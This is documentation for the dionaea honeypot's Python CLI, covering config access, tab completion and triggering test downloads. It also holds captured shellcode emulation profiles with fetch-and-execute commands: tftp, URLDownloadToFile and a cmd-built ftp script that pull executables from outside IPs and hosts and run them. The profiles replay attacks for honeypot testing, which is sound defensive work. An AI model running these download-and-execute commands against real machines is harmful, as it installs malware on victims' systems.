Tips and Tricks
===============

dionaea embedds a python interpreter, and can offer a python cli
therefore too.
*The python cli is blocking*, if you start entering a command, the whole
process will wait for you to finish it, and not accept any new connections.
You can use the python cli to interact with dionaea, which is very
useful for development and debugging.


Configuration
-------------

You can access the dionaea.conf via python (readonly)::

      from dionaea import g_dionaea
      g_dionaea.config()


Completition and History on the CLI
-----------------------------------

If you use the cli often, you can make it behave like a real shell,
including history and completition.::

      import rlcompleter, readline
      readline.parse_and_bind('tab: complete')

Triggering Downloads
--------------------

Sometimes it helps to trigger a download, without waiting for an attack.
Very useful if you want to verify permissions are correct when switching
the user, or making sure a submission to a 3rd party works correctly.
You can trigger downloads for all major protocols.

ftp
---
.. code::

      from dionaea.ftp import ftp
      f = ftp()
      f.download(None, 'anonymous','guest','ftp.kernel.org',21, 'welcome.msg', 'binary','ftp://ftp.kernel.org/welcome.msg')


tftp
----

.. code::

      from dionaea.tftp import TftpClient
      t = TftpClient()
      t.download(None, 'tftp.example.com', 69, 'filename')

http
----

As the http download is not done in python, we do not use the download
facility directly, but create an incident, which will trigger the download::

      from dionaea.core import incident
      i = incident("dionaea.download.offer")
      i.set("url", "http://www.honeynet.org")
      i.report()

incidents
---------

incidents are the ipc used in dionaea.

dumping
-------

.. code::

      from dionaea.core import ihandler
      class idumper(ihandler):
              def __init__(self, pattern):
                      ihandler.__init__(self, pattern)
              def handle(self, icd):
                      icd.dump()

      a = idumper('*')

emu profile
-----------

Small collection of various shellcode profiles gatherd from dionaea.


CreateProcess Commands
----------------------

This profile will trigger a download via tftp.\

.. code::

      p='[{"call": "CreateProcess", "args": ["", "tftp.exe -i 92.17.46.208 get ssms.exe", "", "", "1", "40", "", "", {"dwXCountChars": "0", "dwFillAttribute": "0", "hStdInput": "0", "dwYCountChars": "0", "cbReserved2": "0", "cb": "0", "dwX": "0", "dwY": "0", "dwXSize": "0", "lpDesktop": "0", "hStdError": "68", "dwFlags": "0", "lpReserved": "0", "lpReserved2": "0", "hStdOutput": "0", "lpTitle": "0", "dwYSize": "0", "wShowWindow": "0"}, {"dwProcessId": "4712", "hProcess": "4711", "dwThreadId": "4714", "hThread": "4712"}], "return": "-1"}, {"call": "CreateProcess", "args": ["", "ssms.exe", "", "", "1", "40", "", "", {"dwXCountChars": "0", "dwFillAttribute": "0", "hStdInput": "0", "dwYCountChars": "0", "cbReserved2": "0", "cb": "0", "dwX": "0", "dwY": "0", "dwXSize": "0", "lpDesktop": "0", "hStdError": "68", "dwFlags": "0", "lpReserved": "0", "lpReserved2": "0", "hStdOutput": "0", "lpTitle": "0", "dwYSize": "0", "wShowWindow": "0"}, {"dwProcessId": "4712", "hProcess": "4711", "dwThreadId": "4714", "hThread": "4712"}], "return": "-1"}, {"call": "ExitThread", "args": ["0"], "return": "0"}]'
      from dionaea.core import incident
      i = incident("dionaea.module.emu.profile")
      i.set("profile", str(p))
      i.report()


URLDownloadToFile
-----------------

This profile will trigger a download.

.. code::

      p='[{"call": "LoadLibraryA", "args": ["urlmon"], "return": "0x7df20000"}, {"call": "URLDownloadToFile", "args": ["", "http://82.165.32.34/compiled.exe", "47.scr", "0", "0"], "return": "0"}, {"call": "WinExec", "args": ["47.scr", "895"], "return": "32"}]'
      from dionaea.core import incident
      i = incident("dionaea.module.emu.profile")
      i.set("profile", str(p))
      i.report()

WinExec Commands
----------------

This profile uses WinExec to create a command file for windows ftp
client, downloads a file, and executes the file.::

      p='[{"call": "WinExec", "args": ["cmd /c echo open welovewarez.com 21 > i&echo user wat l0l1 >> i &echo get SCUM.EXE >> i &echo quit >> i &ftp -n -s:i &SCUM.EXE\\r\\n", "0"], "return": "32"}, {"call": "ExitThread", "args": ["0"], "return": "0"}]'
      from dionaea.core import incident
      i = incident("dionaea.module.emu.profile")
      i.set("profile", str(p))
      i.report()
